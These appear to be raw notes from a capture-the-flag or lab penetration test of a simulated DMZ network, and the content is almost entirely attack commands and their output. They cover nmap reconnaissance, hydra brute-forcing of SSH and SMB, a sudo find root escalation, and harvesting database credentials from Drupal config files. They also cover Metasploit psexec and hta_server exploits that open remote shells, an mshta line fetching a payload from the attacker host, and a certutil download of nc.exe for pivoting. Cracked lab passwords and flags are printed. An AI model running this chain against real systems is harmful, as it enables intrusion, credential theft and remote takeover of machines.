## ifconfig : 192.168.100.5 
	nmap -sn 192.168.100.0/24
		Nmap scan report for ip-192-168-100-1.ap-southeast-1.compute.internal (192.168.100.1)
		Host is up (0.00016s latency).
		MAC Address: 06:D2:B9:F2:8B:D3 (Unknown)
  
		Nmap scan report for ip-192-168-100-50.ap-southeast-1.compute.internal (192.168.100.50)
		Host is up (0.0024s latency).
		MAC Address: 06:ED:45:4A:08:01 (Unknown)
	 
		Nmap scan report for ip-192-168-100-51.ap-southeast-1.compute.internal (192.168.100.51)
		Host is up (0.0013s latency).
		MAC Address: 06:2B:8B:07:04:ED (Unknown)
	 
		Nmap scan report for ip-192-168-100-52.ap-southeast-1.compute.internal (192.168.100.52)
		Host is up (0.0013s latency).
		MAC Address: 06:59:7C:9E:10:33 (Unknown)
	 
		Nmap scan report for ip-192-168-100-55.ap-southeast-1.compute.internal (192.168.100.55)
		Host is up (0.0024s latency).
		MAC Address: 06:BA:1A:A8:96:E3 (Unknown)
	 
		Nmap scan report for ip-192-168-100-63.ap-southeast-1.compute.internal (192.168.100.63)
		Host is up (0.00076s latency).
		MAC Address: 06:75:73:67:44:E5 (Unknown)
	 
		Nmap scan report for ip-192-168-100-67.ap-southeast-1.compute.internal (192.168.100.67)
		Host is up (0.00070s latency).
		MAC Address: 06:3C:71:65:43:6B (Unknown)
	 
		Nmap scan report for ip-192-168-100-5.ap-southeast-1.compute.internal (192.168.100.5)
		Host is up.
		Nmap done: 256 IP addresses (8 hosts up) scanned in 1.83 seconds

## nmap -p 80 192.168.100.0/24

	Nmap scan report for ip-192-168-100-1.ap-southeast-1.compute.internal (192.168.100.1)
		80/tcp filtered http
	
	Nmap scan report for ip-192-168-100-50.ap-southeast-1.compute.internal (192.168.100.50)
		80/tcp open  http
		=> Wampserver
		=> Apache 2.4-MySQL 5 & 8-MariaDB 10-PHP 5, 7 & 8 
	
	Nmap scan report for ip-192-168-100-51.ap-southeast-1.compute.internal (192.168.100.51)
		80/tcp open  http
		=> IIS
	
	Nmap scan report for ip-192-168-100-52.ap-southeast-1.compute.internal (192.168.100.52)
		80/tcp open  http
		=> drupal
	
	Nmap scan report for ip-192-168-100-55.ap-southeast-1.compute.internal (192.168.100.55)
		80/tcp open  http
		=> IIS
	
	Nmap scan report for ip-192-168-100-63.ap-southeast-1.compute.internal (192.168.100.63)
		80/tcp filtered http
	
	Nmap scan report for ip-192-168-100-67.ap-southeast-1.compute.internal (192.168.100.67)
		80/tcp closed http
	
	
	Nmap scan report for ip-192-168-100-5.ap-southeast-1.compute.internal (192.168.100.5)
		80/tcp closed http

## nc 192.168.100.63 80
	administrator as the username and pass@word1 
## nmap -sV -p- 192.168.100.1
	Host is up (0.00031s latency).

## nmap -O 192.168.100.1

## Q1 .How many hosts on the DMZ network are running a database server? 
	the following is found info : 
	
## nmap -sV 192.168.100.50  (W)
	80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3307/tcp  open  opsession-prxy?
	3389/tcp  open  ssl/ms-wbt-server?
	5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	49152/tcp open  msrpc              Microsoft Windows RPC
	49153/tcp open  msrpc              Microsoft Windows RPC
	49154/tcp open  msrpc              Microsoft Windows RPC
	49155/tcp open  msrpc              Microsoft Windows RPC
	49156/tcp open  msrpc              Microsoft Windows RPC
	49179/tcp open  msrpc              Microsoft Windows RPC

	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

## nmap -sV -p- 192.168.100.51 (w)
	21/tcp    open  ftp                Microsoft ftpd
	80/tcp    open  http               Microsoft IIS httpd 8.5
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3389/tcp  open  ssl/ms-wbt-server?
	5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	49152/tcp open  msrpc              Microsoft Windows RPC
	49153/tcp open  msrpc              Microsoft Windows RPC
	49154/tcp open  msrpc              Microsoft Windows RPC
	49155/tcp open  msrpc              Microsoft Windows RPC
	49156/tcp open  msrpc              Microsoft Windows RPC
	49174/tcp open  msrpc              Microsoft Windows RPC
	
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows


## nmap -sV -p- 192.168.100.52

	21/tcp   open  ftp           vsftpd 3.0.3
	22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	80/tcp   open  http          Apache httpd 2.4.41
	139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
	3389/tcp open  ms-wbt-server xrdp
	Service Info: Host: IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	
	ftp 192.168.100.52 21 anonymous
## nmap -sV -p- 192.168.100.55 (w)
	80/tcp   open  http          Microsoft IIS httpd 10.0
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

## nmap -sV -p- 192.168.100.63 (w)
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## nmap -sV -p- 192.168.100.67
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## nmap -sV -p- 192.168.100.5
	22/tcp   open  ssh           OpenSSH 8.7p1 Debian 2 (protocol 2.0)
	3389/tcp open  ms-wbt-server xrdp
	5910/tcp open  vnc           VNC (protocol 3.8)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
## ftp 192.168.100.52 21 (anonymous)
	get updates.txt
	=> Your Drupal usernames are exactly the same as your user account passwords
## nano users.txt 
	vincenz
	auditor
	mike
	admin

##  hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.100.52  ssh
[22][ssh] host: 192.168.100.52   login: auditor   password: qwertyuiop

##  ssh auditor@192.168.100.52
	=> flag.txt : 80ff65343fc04e4b8be4002f774cbd97
	=> login auditor:qwertyuiop
## msfconsole -q
	use auxiliary/scanner/ssh/ssh_login 
	set USERNAME auditor
	set PASSWORD qwertyuiop
	set RHOSTS 192.168.100.52
	run
## cat CHANGELOG.txt | grep -n  "Updates from Drupal versions prior to 5.x will"
	=> Drupal 7.57, 2018-02-21
	
	uname -r (5.13.0-1021-aws)

## sessions -u 1
	cd /var/www/html/drupal/
	grep -r 'password'
## sessions -u 1
	sites/default/default.settings.php
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sites/default/default.settings.php:# $conf['proxy_password'] = '';
	sites/default/settings.php: *   'password' => 'password',
	sites/default/settings.php: * username, password, host, and database name.
	sites/default/settings.php: *   'password' => 'password',
	sites/default/settings.php: *   'password' => 'password',
	sites/default/settings.php: *     'password' => 'password',
	sites/default/settings.php: *     'password' => 'password',
	sites/default/settings.php:      'password' => 'syntex0421',
## * Database configuration format:
	 * @code
	 *   $databases['default']['default'] = array(
	 *     'driver' => 'mysql',
	 *     'database' => 'databasename',
	 *     'username' => 'username',
	 *     'password' => 'password',
	 *     'host' => 'localhost',
	 *     'prefix' => '',
	 *   );
	 *   $databases['default']['default'] = array(
	 *     'driver' => 'pgsql',
	 *     'database' => 'databasename',
	 *     'username' => 'username',
	 *     'password' => 'password',
	 *     'host' => 'localhost',
	 *     'prefix' => '',
	 *   );
	 *   $databases['default']['default'] = array(
	 *     'driver' => 'sqlite',
	 *     'database' => '/path/to/databasefilename',
	 *   );
	 * @endcode
	 */
	$databases = array (
	  'default' => 
	  array (
	    'default' => 
	    array (
	      'database' => 'drupal',
	      'username' => 'drupal',
	      'password' => 'syntex0421',
	      'host' => 'localhost',
	      'port' => '3306',
	      'driver' => 'mysql',
	      'prefix' => '',
	    ),
	  ),
	);
## auditor@ip-192-168-100-52> mysql -u drupal -p -h localhost -P 3306 drupal
	syntex0421
	SHOW TABLES;
	quit

## SELECT mail FROM users WHERE uid = 1;
	quit
	=> admin@syntex.com
## sudo -l 
    (root) NOPASSWD: /usr/bin/find
	
	https://gtfobins.github.io/gtfobins/find/#sudo
	sudo find . -exec /bin/sh \; -quit
	
	cat /root/flag.txt : e0fe4aebbff1450da0a34cc2c3a15c55

	192.168.100.50\wordpress\xmlrpc.php
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	192.168.100.50
	=> wordpress
	PHP Version 7.4.26
	Windows NT WINSERVER-01 6.3 build 9600 (Windows Server 2012 R2 Standard Edition) AMD64 

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://192.168.100.50
	[445][smb] host: 192.168.100.50   login: admin   password: superman	

## msfconsole -q
		use exploit/windows/smb/psexec
		set RHOSTS 192.168.100.50
		set SMBUser admin
		set SMBPass superman
		set LPORT 3333
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter >
	=> type C:\Users\mike\Documents\flag.txt
	=> type C:\Users\Administrator\Desktop\flag.txt

	C:\>net user lawrence        
	net user lawrence
	The user name could not be found.
## msfconsole -q
	use auxiliary/scanner/http/wordpress_xmlrpc_login  
	set RHOSTS 192.168.100.50
	set USERNAME admin
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set VERBOSE false
	set TARGETURI /wordpress
	run
	
	[+] 192.168.100.50:80 - Success: 'admin:estrella'
	192.168.100.50/wordpress/wp-config.php
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	typeC:\wamp64\www\wordpress\wp-includes\version.php 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	net user 
	admin                    Administrator            Guest                    
	mike                     vince             
	
	powershell -command "Get-LocalUser | Where-Object { $_.Name -ne 'Guest' } | Measure-Object"
	
	
	wmic qfe list > hotfixes.txt
	find /c /v "" hotfixess.txt
	HOTFIXES.TXT: 220
	
	powershell -command "Get-HotFix"
	powershell -command "(Get-HotFix).Count"
## nano pass01.txt
	diamond
	greenday
	superman
	bonita
	hydra -l mike -P  pass01.txt 192.168.100.50  smb
	[22][ssh] host: 192.168.100.52   login: auditor   password: qwertyuiop
	
	[445][smb] host: 192.168.100.50   login: mike   password: diamond

## ftp 192.168.100.51 21 (anonymous)
	192.168.100.51/cmdasp.aspx
	command: 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		use exploit/windows/misc/hta_server
		set RHOSTS 192.168.100.51
		
		Local IP: http://192.168.100.5:8080/yCaDYz5CHpbXti.hta
	
		mshta.exe http://192.168.100.5:8080/yCaDYz5CHpbXti.hta
## nano users_02.txt
	admin
	steven
	mike
	lawrence
	
	hydra -L users_02.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://192.168.100.51
	[445][smb] host: 192.168.100.51   login: steven   password: bonita
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.100.55
	[445][smb] host: 192.168.100.55   login: Administrator   password: swordfish
## msfconsole -q
		use exploit/windows/smb/psexec
		set RHOSTS 192.168.100.55
		set SMBUser Administrator 
		set SMBPass swordfish
		set LPORT 2222
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	C:\Users\Administrator>type flag.txt
	type flag.txt
	1b696b4be10344549f8f3e03e6a77b5f
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	dir /s todo.txt
	C:\inetpub\wwwroot\todo.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	C:\>arp  -a
	Interface: 192.168.0.50 --- 0x1b
	  Internet Address      Physical Address      Type
	  192.168.0.1           02-25-dd-44-96-91     dynamic   
	  192.168.0.2           02-25-dd-44-96-91     dynamic   
	  192.168.0.255         ff-ff-ff-ff-ff-ff     static    
## nano pass00.txt
	blanca
	computadora
	vincenzzo
	lw9875
	hydra -l lawrence -P pass00.txt smb://192.168.100.55
	[445][smb] host: 192.168.100.55   login: lawrence   password: computadora
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		cd /usr/share/windows-binaries
		python3 -m http.server 80
		cd C:Users\Administrator\Desktop
		certutil -urlcache -f http://192.168.100.5/nc.exe nc.exe
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		(for %p in (22 3389 80 10000) do nc.exe -zv 192.168.0.50 %p)
		C:\Users\Administrator\Desktop>nc.exe -zv 192.168.0.50 3389 
		ip-192-168-0-50.ap-southeast-1.compute.internal [192.168.0.50] 3389 (ms-wbt-server) open
